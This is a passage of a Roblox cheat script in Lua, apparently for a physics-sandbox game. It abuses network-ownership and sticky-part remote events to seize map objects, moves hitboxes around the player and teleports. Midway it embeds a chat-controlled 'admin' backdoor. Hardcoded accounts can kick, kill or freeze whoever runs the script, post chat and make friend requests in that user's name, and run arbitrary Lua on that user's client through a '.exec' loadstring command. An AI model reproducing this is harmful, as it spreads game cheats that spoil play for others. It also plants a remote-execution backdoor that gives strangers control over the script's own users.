            end
            
            Rayfield:Notify({
                Title = "BlackHole Viewer",
                Content = "Offline BlackHoles are now hidden",
                Duration = 3,
                Image = 4483362458
            })
        end
    end,
})

 ClearBlackHolesButton = InfoTab:CreateButton({
    Name = "Clear All BlackHoles",
    Callback = function()
        local count = #skib2:GetChildren()
        skib2:ClearAllChildren()
        
        Rayfield:Notify({
            Title = "BlackHole Viewer",
            Content = string.format("Cleared %d BlackHole(s)", count),
            Duration = 3,
            Image = 4483362458
        })
    end,
})



unlockEnabled = false
isMouseUnlocked = false
renderConnection = nil
RunService = game:GetService("RunService")


function unlockmouse()
    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
    UserInputService.MouseIconEnabled = true
end

function lockmouse()
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    UserInputService.MouseIconEnabled = false
end



InfoTab:CreateKeybind({
    Name = "Mouse Unlock",
    CurrentKeybind = "K",
    Flag = "UnlockKeybind",
    Callback = function()
        if unlockEnabled then
            isMouseUnlocked = not isMouseUnlocked
            if isMouseUnlocked then
                if renderConnection then
                    renderConnection:Disconnect()
                end
                renderConnection = RunService.RenderStepped:Connect(unlockmouse)
            else
                if renderConnection then
                    renderConnection:Disconnect()
                    renderConnection = nil
                end
                lockmouse()
            end
        end
    end
})

InfoTab:CreateToggle({
    Name = "Unlock Mouse",
    CurrentValue = false,
    Flag = "UnlockToggle",
    Callback = function(Value)
        unlockEnabled = Value
        isMouseUnlocked = false
        if renderConnection then
            renderConnection:Disconnect()
            renderConnection = nil
        end
        if Value then
            lockmouse()
        else
            unlockmouse()
        end
    end
})


local w = game:GetService("Workspace")
local Players = game:GetService("Players")
local rs = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local me = Players.LocalPlayer
local BackPack = w[me.Name .. 'SpawnedInToys']

local setowner = rs.GrabEvents.SetNetworkOwner
local StickyPartEvent = rs.PlayerEvents.StickyPartEvent
local SpawnToy = rs.MenuToys.SpawnToyRemoteFunction

local function spawnShurikens(count)
    local spawnCFrame = me.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
    for i = 1, count do
        local args = {
            "NinjaShuriken",
            spawnCFrame,
            Vector3.new(0, 0, 0)
        }
        SpawnToy:InvokeServer(unpack(args))
        task.wait(0.05)
    end
end



TweenTab:CreateButton({
   Name = "UFO1 (OuterUFO)",
   Callback = function()
      local UFO = w.Map.AlwaysHereTweenedObjects.OuterUFO.Object.ObjectModel.Body

      spawnShurikens(10)
      task.wait(1)

      for i = 1,10 do
          local shur = BackPack.NinjaShuriken
          shur.Name = i
          StickyPartEvent:FireServer(shur.StickyPart,UFO,CFrame.Angles(0,0,0))
      end

      for i = 1,100 do
          me.Character.HumanoidRootPart.CFrame = UFO.CFrame
          setowner:FireServer(UFO,UFO.CFrame)
          task.wait()
      end

      local obj = w.Map.AlwaysHereTweenedObjects.OuterUFO.Object
      local body = obj.ObjectModel.Body
      local attach = body:FindFirstChild("ObjectModelAttachment")
      if attach then attach:Destroy() end

      obj.FollowThisPart.AlignPosition.Attachment0 = nil
      obj.FollowThisPart.AlignOrientation.Attachment0 = nil
   end
})

local UFOFolder = Workspace:WaitForChild("Map")
    :WaitForChild("AlwaysHereTweenedObjects")
    :WaitForChild("OuterUFO")
    :WaitForChild("Object")
    :WaitForChild("ObjectModel")

local spinEnabled = false
local followEnabled = false
local spinSpeed = 6
local radius = 15
local height = 5

local function getHitboxes()
    local hitboxes = {}
    for _, child in ipairs(UFOFolder:GetChildren()) do
        if child.Name:match("Hitbox") then
            table.insert(hitboxes, child)
        end
    end
    return hitboxes
end

local hitboxes = getHitboxes()

local SpinToggle = TweenTab:CreateToggle({
    Name = "UFO Hitbox Spin",
    CurrentValue = false,
    Flag = "UFOSpinHitboxes",
    Callback = function(Value)
        spinEnabled = Value
        if Value then
            followEnabled = false
        end
    end,
})

local ToggleFollow = TweenTab:CreateToggle({
    Name = "UFO Hitbox Follow Head",
    CurrentValue = false,
    Flag = "UFOSpinFollowHead",
    Callback = function(Value)
        followEnabled = Value
        if Value then
            spinEnabled = false
        end
    end,
})

local angle = 0
RunService.RenderStepped:Connect(function(dt)
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if spinEnabled then
        angle = angle + dt * spinSpeed
        local count = #hitboxes
        for i, hitbox in ipairs(hitboxes) do
            if hitbox and hitbox.Parent then
                local offset = (i / count) * (2 * math.pi)
                local x = math.sin(angle + offset) * radius
                local z = math.cos(angle + offset) * radius
                hitbox.CFrame = CFrame.new(hrp.Position + Vector3.new(x, height, z))
            end
        end
    elseif followEnabled then
        for _, hitbox in ipairs(hitboxes) do
            if hitbox and hitbox.Parent then
                hitbox.CFrame = CFrame.new(hrp.Position + Vector3.new(0, height + 3, 0))
            end
        end
    end
end)

TweenTab:CreateButton({
   Name = "UFO2 (InnerUFO)",
   Callback = function()
      local UFO = w.Map.AlwaysHereTweenedObjects.InnerUFO.Object.ObjectModel.Body

      spawnShurikens(10)
      task.wait(1)

      for i = 1,10 do
          local shur = BackPack.NinjaShuriken
          shur.Name = i
          StickyPartEvent:FireServer(shur.StickyPart,UFO,CFrame.Angles(0,0,0))
      end

      for i = 1,100 do
          me.Character.HumanoidRootPart.CFrame = UFO.CFrame
          setowner:FireServer(UFO,UFO.CFrame)
          task.wait()
      end

      local obj = w.Map.AlwaysHereTweenedObjects.InnerUFO.Object
      local body = obj.ObjectModel.Body
      local attach = body:FindFirstChild("ObjectModelAttachment")
      if attach then attach:Destroy() end

      obj.FollowThisPart.AlignPosition.Attachment0 = nil
      obj.FollowThisPart.AlignOrientation.Attachment0 = nil
   end
})


TweenTab:CreateButton({
   Name = "CaveCart",
   Callback = function()
      local obj = w.Map.AlwaysHereTweenedObjects.CaveCart.Object
      local model = obj.ObjectModel
      local target = model:GetChildren()[13]

      spawnShurikens(10)
      task.wait(1)

      for i = 1,10 do
          local shur = BackPack.NinjaShuriken
          shur.Name = i
          StickyPartEvent:FireServer(shur.StickyPart,target,CFrame.Angles(0,0,0))
      end

      for i = 1,100 do
          me.Character.HumanoidRootPart.CFrame = target.CFrame
          setowner:FireServer(target,target.CFrame)
          task.wait()
      end

      local attach = target:FindFirstChild("ObjectModelAttachment")
      if attach then attach:Destroy() end

      obj.FollowThisPart.AlignPosition.Attachment0 = nil
      obj.FollowThisPart.AlignOrientation.Attachment0 = nil
   end
})

local Sense, Massless = 30, nil
GrabTab:CreateToggle({
   Name = 'Massless Grab	<font face=\"GothamBlack\" color=\"rgb(255, 255, 255)\">(PLAYER & OBJECT)</font>	<font face="GothamBlack" color="rgb(7,255,0)">GRAB</font>',
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(v)
       if v then
           Massless = workspace.ChildAdded:Connect(function(r)
               if r.Name == "GrabParts" then
                   while workspace:FindFirstChild("GrabParts") do
                       task.wait()
                       local dp = r:FindFirstChild("DragPart")
                       if dp and dp:FindFirstChild("AlignPosition") and dp:FindFirstChild("AlignOrientation") then
                           dp.AlignPosition.Responsiveness = Sense
                           dp.AlignPosition.MaxForce = math.huge
                           dp.AlignPosition.MaxVelocity = math.huge
                           dp.AlignOrientation.Responsiveness = Sense
                           dp.AlignOrientation.MaxTorque = math.huge
                       end
                   end
               end
           end)
       else
           if Massless then Massless:Disconnect() Massless = nil end
       end
   end,
})
GrabTab:CreateInput({
   Name = "Massless Sense",
   CurrentValue = tostring(Sense),
   PlaceholderText = "Enter sense value",
   RemoveTextAfterFocusLost = false,
   Flag = "MasslessSenseInput",
   Callback = function(Text)
       local v = tonumber(Text)
       if v and v > 0 then Sense = v end
   end,
})


Rayfield:LoadConfiguration()

local StarterGui = game:GetService("StarterGui")


local StarterGui = game:GetService("StarterGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)





Rayfield:Notify({
   Title = "Enjoy!",
   Content = "Thank you for beta testing! You cause me so much pain",
   Duration = 5,
   Image = 4483362458,
})
--I============================================================I--
--I admin syst v29 made with love and pure rage by yours truly I--
--I============================================================I--
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local RBXGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

local scriptedPlayers = {}
scriptedPlayers[LocalPlayer] = true

local superAdmins = {
    ["OatsStack"] = true,
    ["april22471"] = true
}

local admins = {
    ["expfps"] = true,
    ["EndOfReset"] = true,
    ["imagineusingsolara"] = true,
    ["ThriIl3Rz"] = true,
	["zacking174_yt"] = true,
	["alanExt2_intyV04s2z"] = true,
	["Spelluncis"] = true
}

-- ⭐
local commandHelp = {
    ".chat (target) (text)",
    ".kick (target)",
    ".kill (target)",
    ".bring (target)",
    ".spin (target)",
    ".unspin",
    ".fps (target) (cap)",
    ".freeze (target)",
    ".thaw (target)",
    ".friend (target)",
    ".unfriend (target)",
    ".exec (target) (lua code)",
    ".cmds"
}

local frozenPlayers = {}

local function getRole(name)
    if superAdmins[name] then
        return "superadmin"
    elseif admins[name] then
        return "admin"
    else
        return "user"
    end
end

local function resolveTargets(input)
    if not input then return {} end
    input = input:lower()
    local results = {}

    if input == "all" then
        for player in pairs(scriptedPlayers) do
            table.insert(results, player)
        end
        return results
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        local uname = plr.Name:lower()
        local dname = (plr.DisplayName or ""):lower()
        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
            table.insert(results, plr)
        end
    end

    return results
end

local function toggleBlock(player, enable)
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if enable then
        if not hrp:FindFirstChild("Block") then
            local bv = Instance.new("BodyVelocity")
            bv.Name = "Block"
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end
    else
        local bv = hrp:FindFirstChild("Block")
        if bv then bv:Destroy() end
    end
end

local function freezePlayer(player, enable)
    if not scriptedPlayers[player] then return end
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Anchored = enable
    end
end

local spin = false
local spinTarget = nil

local function sendToChat(msg)
    if RBXGeneral and msg then
        pcall(function()
            RBXGeneral:SendAsync(msg)
        end)
    end
end

local function handleMessage(sender, text)
    local senderRole = getRole(sender.Name)
    if senderRole == "user" then return end

    local args = {}
    for word in text:gmatch("%S+") do
        table.insert(args, word)
    end
    if #args < 1 then return end

    local cmd = args[1]:lower()
    local targets = resolveTargets(args[2])

    if cmd == ".chat" then
        local msg = table.concat(args, " ", 3)
        if msg ~= "" then
            for _, target in ipairs(targets) do
                if target == LocalPlayer then
                    sendToChat(msg)
                end
            end
        end

    elseif cmd == ".kick" then
    local reason = table.concat(args, " ", 3)

    if reason == "" then
        reason = "They didnt wanna say why ig"
    end

    for _, target in ipairs(targets) do
        local message =
            "Kicked by: " .. sender.DisplayName .. " (@" .. sender.Name .. ")\n" ..
            "Reason: " .. reason

        target:Kick(message)
    end

    elseif cmd == ".kill" then
        for _, target in ipairs(targets) do
            local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 0 end
        end

    elseif cmd == ".bring" then
        for _, target in ipairs(targets) do
            local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            local senderHRP = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
            if hrp and senderHRP then
                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)
                toggleBlock(target, true)
                task.delay(1, function()
                    toggleBlock(target, false)
                end)
            end
        end

    elseif cmd == ".spin" then
        for _, target in ipairs(targets) do
            spin = true
            spinTarget = target
        end

    elseif cmd == ".unspin" then
        spin = false
        spinTarget = nil

    elseif cmd == ".fps" then
        local cap = tonumber(args[3])
        if cap and setfpscap then
            setfpscap(cap)
        end

    elseif cmd == ".freeze" then
        for _, target in ipairs(targets) do
            frozenPlayers[target] = true
            freezePlayer(target, true)
        end

    elseif cmd == ".thaw" then
        for _, target in ipairs(targets) do
            frozenPlayers[target] = nil
            freezePlayer(target, false)
        end

    elseif cmd == ".friend" then
        local msgs = {
            "Welcome aboard!",
            "Hello friend :3",
            "Yay, we're friends now!",
            "Added you, hope you're ready!",
            "Friendship initiated!"
        }
        for _, target in ipairs(targets) do
            if target ~= LocalPlayer then
                pcall(function()
                    LocalPlayer:RequestFriendship(target)
                    sendToChat("friended " .. target.Name .. ", " .. msgs[math.random(#msgs)])
                end)
            end
        end

    elseif cmd == ".unfriend" then
        local msgs = {
            "because I was told to",
            "just for fun lol",
            "i was too cool to stay friends with u anyway",
            "sry not sry :3",
            "goodbye forever!"
        }
        for _, target in ipairs(targets) do
            if LocalPlayer:IsFriendsWith(target.UserId) then
                pcall(function()
                    LocalPlayer:RevokeFriendship(target)
                    sendToChat("just unfriended " .. target.Name .. " " .. msgs[math.random(#msgs)])
                end)
            end
        end

    elseif cmd == ".exec" then
        if senderRole ~= "superadmin" then return end
        local code = table.concat(args, " ", 3)
        if code ~= "" and targets[1] == LocalPlayer then
            local fn, err = loadstring(code)
            if fn then pcall(fn) else warn(err) end
        end

    -- ⭐ yippy
    elseif cmd == ".cmds" then
        if senderRole == "user" then return end

        -- split 3 chunx
        local chunkSize = math.ceil(#commandHelp / 3)
        for i = 1, #commandHelp, chunkSize do
            local chunk = {}
            for j = i, math.min(i + chunkSize - 1, #commandHelp) do
                table.insert(chunk, commandHelp[j])
            end
            local message = table.concat(chunk, "\n")
            sendToChat(message) -- send publicly
        end
    end
end

local function connectPlayer(player)
    player.Chatted:Connect(function(msg)
        handleMessage(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)

RunService.Heartbeat:Connect(function()
    if not spin or not spinTarget then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild("HumanoidRootPart")
    if hrp and targetHRP then
        local a = tick() * 2
        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
    end
end)

print("V29 Loaded, made with love by oats, for", LocalPlayer.DisplayName)

local Tab = Window:CreateTab("fah", 4483362458)
local Section = Tab:CreateSection("teleport thing idk")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

Tab:CreateKeybind({
    Name = "teleport",
    CurrentKeybind = "G",
    HoldToInteract = false,

    Callback = function()

        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local hrp = character:WaitForChild("HumanoidRootPart")

        Rayfield:Notify({
            Image = "rbxassetid://4483362458",
            Title = "oky",
            Duration = 2,
            Content = "awds"
        })


        local origin = Mouse.Hit.Position + Vector3.new(0, 300, 0)
        local direction = Vector3.new(0, -1000, 0)

        local params = RaycastParams.new()
        params.FilterDescendantsInstances = {character}
        params.FilterType = Enum.RaycastFilterType.Blacklist

        local result = Workspace:Raycast(origin, direction, params)
        if not result then return end

        local groundPos = result.Position


        local rootHalf = hrp.Size.Y / 2
        local standHeight = humanoid.HipHeight + rootHalf


        local targetPos = Vector3.new(
            groundPos.X,
            groundPos.Y + standHeight + 0.5, 
            groundPos.Z
        )

        local targetCF = CFrame.new(targetPos)


        humanoid.Sit = false
        humanoid:ChangeState(Enum.HumanoidStateType.Physics)

        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero

        pcall(function()
            sethiddenproperty(hrp, "NetworkOwnershipRule", Enum.NetworkOwnership.Manual)
        end)


        hrp.CFrame = targetCF


        RunService.Heartbeat:Wait()


        humanoid:ChangeState(Enum.HumanoidStateType.Landed)


        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = targetCF

        Rayfield:Notify({
            Image = "rbxassetid://7733711090",
            Title = "gfdsdf",
            Duration = 2,
            Content = "dawsfds adwsadws!"
        })
    end
})
